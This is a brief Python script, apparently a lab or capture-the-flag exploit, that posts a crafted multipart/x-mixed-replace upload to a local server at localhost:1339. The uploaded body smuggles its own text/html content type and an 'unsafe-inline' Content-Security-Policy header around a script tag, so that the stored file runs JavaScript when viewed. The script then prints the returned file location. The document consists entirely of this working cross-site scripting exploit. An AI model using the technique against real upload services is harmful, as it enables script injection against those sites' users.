import requests
from io import BytesIO

payload = BytesIO(b"""--MYBOUNDARY\r\nContent-type: text/html\r\nContent-Security-Policy: script-src 'unsafe-inline';\r\n\r\n<script>alert(1)</script>\r\n--MYBOUNDARY--""")
files = {
    'file': ('myfilename.pwn', payload, 'multipart/x-mixed-replace; boundary=MYBOUNDARY'),
}
r = requests.post(f"http://localhost:1339/upload", files=files, allow_redirects=False)
print(r)
floc = r.headers['Location']
print(floc)

